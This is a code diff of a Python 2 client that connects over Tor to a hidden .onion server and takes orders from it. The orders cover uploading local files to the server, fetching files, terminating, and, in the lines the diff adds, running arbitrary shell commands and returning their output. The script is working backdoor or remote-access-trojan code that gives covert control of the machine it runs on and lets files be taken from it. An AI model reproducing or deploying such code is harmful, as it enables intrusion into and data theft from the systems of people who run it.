@@ -1,14 +1,13 @@
-import socket, ssl, pprint, socks, sys, os, hmac, hashlib
+import socket, ssl, pprint, socks, os, sys, hashlib, hmac
+from colored import fg, bg, attr
+from subprocess import Popen, PIPE, STDOUT
 
 host = '3pnzzdpq7aj6s6b6.onion'
+cType = "client000-crypto"
 
 def RecvData():
     temp = ssl_sock.read()
-    # edit to handle "big" data 
     return temp
-
-def SendData(inText):
-    ssl_sock.write(inText)
 
 def CheckHash(fileName,fileHashHEX):
     with open(fileName, 'rb') as inFile:
@@ -24,6 +23,13 @@ def CalcHash(fileName):
         buf = inFile.read()
         hasher.update(buf)
     return hasher.hexdigest()
+
+def SendData(inText):
+    ssl_sock.write(inText)
+
+def EXEC(cmd):
+    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+    return p.stdout.read()
 
 def UploadFILE(fileName):
     fileUP = open(fileName, 'rb')
@@ -46,23 +52,24 @@ def DownloadFILE(fileName):
         else: 
             fileDOWN.write(temp)
     fileDOWN.close()
-    SendData("CDF") #Client Download Finished
+    SendData("CDF")
+
 
 sock = socks.socksocket()
 sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
 sock.connect((host,5555))
 
-# Require a certificate from the server. We used a self-signed certificate so here ca_certs must be the server certificate itself.
 ssl_sock = ssl.wrap_socket(sock,
-                           ca_certs="priv_dom.crt",
+                           ca_certs="priv_dom2.crt",
                            cert_reqs=ssl.CERT_REQUIRED)
+
 
 print repr(ssl_sock.getpeername())
 print ssl_sock.cipher()
 print pprint.pformat(ssl_sock.getpeercert())
+SendData(cType)
 
 while 1:
-	#ssl_sock.write("boo!")
     inText = RecvData()
     if inText.startswith("download"):
         UploadFILE(inText.split(" ")[1])
@@ -72,8 +79,21 @@ while 1:
     elif inText == "terminate":
         ssl_sock.close()
         sys.exit(0)
+    elif inText.startswith("exec"):
+        outEXEC = EXEC(inText.split(":")[1])
+        SendData(outEXEC)
     else:
         print '[inText] ' + inText
-        SendData(inText)
-    # def handle function to exit
+        ssl_sock.write(inText)
+
+#if False: # from the Python 2.7.3 docs
+    # Set a simple HTTP request -- use httplib in actual code.
+#    ssl_sock.write("""GET / HTTP/1.0\r
+#    Host: www.verisign.com\n\n""")
+
+    # Read a chunk of data.  Will not necessarily
+    # read all the data returned by the server.
+#    data = ssl_sock.read()
+
+    # note that closing the SSLSocket will also close the underlying socket
 #    ssl_sock.close()
